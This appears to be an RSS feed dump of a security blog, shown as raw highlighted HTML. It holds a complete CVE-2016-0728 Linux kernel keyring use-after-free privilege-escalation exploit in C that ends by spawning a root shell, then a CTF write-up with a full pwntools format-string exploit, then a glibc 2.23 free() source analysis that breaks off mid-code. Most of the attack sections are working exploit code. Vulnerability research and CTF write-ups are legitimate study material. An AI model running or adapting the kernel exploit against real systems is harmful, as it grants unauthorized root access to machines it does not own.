class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;keyutils.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line">_commit_creds commit_creds;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STRUCT_LEN (0xb8 - 0x30)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS_ADDR (0xffffffff81094250)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CREDS_ADDR (0xffffffff81094550)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> * name;</span><br><span class="line">    <span class="keyword">size_t</span> datalen;</span><br><span class="line">    <span class="keyword">void</span> * vet_description;</span><br><span class="line">    <span class="keyword">void</span> * preparse;</span><br><span class="line">    <span class="keyword">void</span> * free_preparse;</span><br><span class="line">    <span class="keyword">void</span> * instantiate;</span><br><span class="line">    <span class="keyword">void</span> * update;</span><br><span class="line">    <span class="keyword">void</span> * match_preparse;</span><br><span class="line">    <span class="keyword">void</span> * match_free;</span><br><span class="line">    <span class="keyword">void</span> * revoke;</span><br><span class="line">    <span class="keyword">void</span> * destroy;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">userspace_revoke</span><span class="params">(<span class="keyword">void</span> * key)</span> </span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *keyring_name;</span><br><span class="line"><span class="keyword">size_t</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> l = <span class="number">0x100000000</span>/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">key_serial_t</span> serial = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">pid_t</span> pid = <span class="number">-1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key_type</span> * <span class="title">my_key_type</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    </span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span> </span><br><span class="line">        <span class="keyword">long</span> mtype;</span><br><span class="line"><span class="keyword">char</span> mtext[STRUCT_LEN];</span><br><span class="line">&#125; </span><br><span class="line">    msg = &#123;<span class="number">0x4141414141414141</span>, &#123;<span class="number">0</span>&#125;&#125;;</span><br><span class="line"><span class="keyword">int</span> msqid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;usage: ./keys &lt;key_name&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid()); </span><br><span class="line">    commit_creds = (_commit_creds) COMMIT_CREDS_ADDR;</span><br><span class="line">    prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CREDS_ADDR;</span><br><span class="line">    </span><br><span class="line">    my_key_type = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(*my_key_type));</span><br><span class="line"></span><br><span class="line">    my_key_type-&gt;revoke = (<span class="keyword">void</span>*)userspace_revoke;</span><br><span class="line">    <span class="built_in">memset</span>(msg.mtext, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(msg.mtext));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// key-&gt;uid</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">56</span>]) = <span class="number">0x3e8</span>; <span class="comment">/* geteuid() */</span></span><br><span class="line">    <span class="comment">//key-&gt;perm</span></span><br><span class="line">    *(<span class="keyword">int</span>*)(&amp;msg.mtext[<span class="number">64</span>]) = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key-&gt;type</span></span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;msg.mtext[<span class="number">80</span>]) = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)my_key_type;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    keyring_name = argv[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set the new session keyring before we start */</span></span><br><span class="line"></span><br><span class="line">serial = keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name);</span><br><span class="line"><span class="keyword">if</span> (serial &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (keyctl(KEYCTL_SETPERM, serial, KEY_POS_ALL | KEY_USR_ALL | KEY_GRP_ALL | KEY_OTH_ALL) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Increfing...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">0xfffffffd</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == (<span class="number">0xffffffff</span> - l)) &#123;</span><br><span class="line">            l = l/<span class="number">2</span>;</span><br><span class="line">            sleep(<span class="number">5</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="comment">/* here we are going to leak the last references to overflow */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">5</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_JOIN_SESSION_KEYRING, keyring_name) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished increfing&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;forking...&quot;</span>);</span><br><span class="line">    <span class="comment">/* allocate msg struct in the kernel rewriting the freed keyring object */</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">64</span>; i++) &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">-1</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            sleep(<span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ((msqid = msgget(IPC_PRIVATE, <span class="number">0644</span> | IPC_CREAT)) == <span class="number">-1</span>) &#123;</span><br><span class="line">                perror(<span class="string">&quot;msgget&quot;</span>);</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">64</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msgsnd(msqid, &amp;msg, <span class="keyword">sizeof</span>(msg.mtext), <span class="number">0</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">                    perror(<span class="string">&quot;msgsnd&quot;</span>);</span><br><span class="line">                    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            sleep(<span class="number">-1</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;finished forking&quot;</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* call userspace_revoke from kernel */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;caling revoke...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;keyctl_revoke&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid=%d, euid=%d\n&quot;</span>, getuid(), geteuid());</span><br><span class="line">    execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;/bin/sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/70257118/99533180-d2c1cd80-29e8-11eb-9a4d-35319be58303.png" alt="CVE-2016-0728"></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><ul><li><a href="https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f">https://gist.github.com/PerceptionPointTeam/18b1e86d1c0f8531ff8f</a></li><li><a href="https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/">https://bpsecblog.wordpress.com/2016/04/10/translate_cve20160728/</a></li><li><a href="https://duasynt.com/blog/cve-2016-0728-poc-not-working">https://duasynt.com/blog/cve-2016-0728-poc-not-working</a></li><li><a href="https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/">https://defenit.kr/2019/11/12/Pwn/%E3%84%B4%20Research/CVE_2016_0728/</a></li><li><a href="http://egloos.zum.com/rousalome/v/9964885">http://egloos.zum.com/rousalome/v/9964885</a></li><li><a href="https://procdiaru.tistory.com/89">https://procdiaru.tistory.com/89</a></li><li><a href="http://blog.naver.com/skinfosec2000/220612669396">http://blog.naver.com/skinfosec2000/220612669396</a></li><li><a href="https://asiagaming.tistory.com/160">https://asiagaming.tistory.com/160</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/1-day/">1-day</category>
      
      <category domain="https://pwnkidhn.github.io/tags/UAF/">UAF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/CVE/">CVE</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Linux-Kernel/">Linux Kernel</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/11/02/2020-11-03-CVE-2016-0728/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2020 BoB CTF </title>
      <link>https://pwnkidhn.github.io/2020/10/02/2020-10-03-BoB_CTF_2020/</link>
      <guid>https://pwnkidhn.github.io/2020/10/02/2020-10-03-BoB_CTF_2020/</guid>
      <pubDate>Fri, 02 Oct 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;center&gt;2020 BoB CTF Write-up &lt;/center&gt;


&lt;h1 id=&quot;porn-master-pwnable&quot;&gt;&lt;a href=&quot;#porn-master-pwnable&quot; class=&quot;headerlink&quot; title=&quot;porn_master (pwnable)&quot;&gt;&lt;/a&gt;porn_master (pwnable)&lt;/h1&gt;&lt;h2 id=&quot;vulnerability&quot;&gt;&lt;a href=&quot;#vulnerability&quot; class=&quot;headerlink&quot; title=&quot;vulnerability&quot;&gt;&lt;/a&gt;vulnerability&lt;/h2&gt;&lt;p&gt;It is the porn_master on BoB9 CTF.  let’s check protection.&lt;br&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/70257118/91448805-502be500-e8b5-11ea-9e24-98c756b7c800.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;It is full protection. then we should know pie-base and libc-base when we exploit it.&lt;br&gt;let’s see the binary on IDA!&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<center>2020 BoB CTF Write-up </center><h1 id="porn-master-pwnable"><a href="#porn-master-pwnable" class="headerlink" title="porn_master (pwnable)"></a>porn_master (pwnable)</h1><h2 id="vulnerability"><a href="#vulnerability" class="headerlink" title="vulnerability"></a>vulnerability</h2><p>It is the porn_master on BoB9 CTF.  let’s check protection.<br><img src="https://user-images.githubusercontent.com/70257118/91448805-502be500-e8b5-11ea-9e24-98c756b7c800.png" alt="1"><br>It is full protection. then we should know pie-base and libc-base when we exploit it.<br>let’s see the binary on IDA!</p><span id="more"></span><p><img src="https://user-images.githubusercontent.com/70257118/91447645-e0692a80-e8b3-11ea-82af-cd776583bc13.png" alt="image"><br>we can find format string bug on line 28.  but we can only write 0x18 at once to buf.<br>and also we can write two times because of the <code>for loop</code> on line 24.<br>so first time we need to leak pie_addr and libc_addr on stack. then we can get its base_addr.<br>and second time we overwrite <code>printf_ret_addr</code> to <code>printf_addr</code> on  line 21(It is pie_addr).<br>then we jump to line21. we have two opportunities to use format string bug again.<br>according to this, we can make many opportunities, if we overwrite <code>print_ret_addr</code>.<br>we can’t overwrite got because of full relro. so we should overwrite __malloc_hook.<br>let’s overwrite __malloc_hook to oneshot gadget  and get flag!</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&#x27;52.79.163.146&#x27;, 12002)</span></span><br><span class="line">p = process(<span class="string">&#x27;./porn_master&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./porn_master&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;lk:%19$p:%17$p:%16$p::&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;lk:&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">libc_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">pie_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;:&#x27;</span>)[:-<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">libcbase = libc_leak - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>] - <span class="number">231</span></span><br><span class="line">piebase = pie_leak - <span class="number">0xa60</span></span><br><span class="line"></span><br><span class="line">printf_ret = stack_leak - <span class="number">0x140</span></span><br><span class="line">main_ret = stack_leak - <span class="number">0xe0</span></span><br><span class="line">log.info(<span class="string">&#x27;libc_base : &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">log.info(<span class="string">&#x27;pie_base : &#x27;</span> + <span class="built_in">hex</span>(piebase))</span><br><span class="line">log.info(<span class="string">&#x27;printf_ret : &#x27;</span> + <span class="built_in">hex</span>(printf_ret))</span><br><span class="line"></span><br><span class="line">malloc_hook = libcbase + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">oneshot = libcbase + <span class="number">0x4f365</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#log.info(hex(malloc_hook))</span></span><br><span class="line">log.info(<span class="built_in">hex</span>(oneshot))</span><br><span class="line"></span><br><span class="line">printf = piebase + <span class="number">0x97c</span></span><br><span class="line"></span><br><span class="line">low = printf &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">low_main = oneshot &amp; <span class="number">0xffff</span></span><br><span class="line">high_main = (oneshot &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(low_main)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(high_main)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low_main)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;CCC&#x27;</span></span><br><span class="line">payload += p64(main_ret)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(low)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;AAA&#x27;</span></span><br><span class="line">payload += p64(printf_ret)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Name : &#x27;</span>,<span class="string">&#x27;AAAA&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;%&#123;&#125;c&#x27;</span>.<span class="built_in">format</span>(high_main)</span><br><span class="line">payload += <span class="string">&#x27;%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;DDD&#x27;</span></span><br><span class="line">payload += p64(main_ret+<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">p.sendafter(<span class="string">&#x27;&gt; &#x27;</span>,payload)</span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line"><span class="comment">#p.sendafter(&#x27;&gt; &#x27;,&#x27;AAAA&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://pwnkidhn.github.io/categories/Write-up/">Write-up</category>
      
      
      <category domain="https://pwnkidhn.github.io/tags/CTF/">CTF</category>
      
      <category domain="https://pwnkidhn.github.io/tags/Write-up/">Write-up</category>
      
      <category domain="https://pwnkidhn.github.io/tags/pwnable/">pwnable</category>
      
      
      <comments>https://pwnkidhn.github.io/2020/10/02/2020-10-03-BoB_CTF_2020/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>free (glibc-2.23)</title>
      <link>https://pwnkidhn.github.io/2020/08/06/2020-08-07-free_glibc_2_23/</link>
      <guid>https://pwnkidhn.github.io/2020/08/06/2020-08-07-free_glibc_2_23/</guid>
      <pubDate>Thu, 06 Aug 2020 15:00:00 GMT</pubDate>
      
      <description>&lt;ul&gt;
&lt;li&gt;glibc-2.23 free 분석&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;source&lt;/strong&gt; : &lt;a href=&quot;https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c&quot;&gt;https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c&lt;/a&gt;&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<ul><li>glibc-2.23 free 분석</li></ul><p><strong>source</strong> : <a href="https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c">https://github.com/andigena/glibc-2.23-0ubuntu3/blob/master/malloc/malloc.c</a></p><span id="more"></span><h2 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span></span><br><span class="line">__libc_free (<span class="keyword">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">void</span> (*hook) (<span class="keyword">void</span> *, <span class="keyword">const</span> <span class="keyword">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// __free_hook 함수가 설정되어있으면 해당 함수 실행</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// free인자가 0일경우 종료 </span></span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line">  <span class="comment">// chunk의 header 주소를 p에 저장</span></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))   <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  <span class="comment">// chunk에 is_mmapped flag가 설정되어있다면 아래 방식으로 해제 (분석중..)</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span 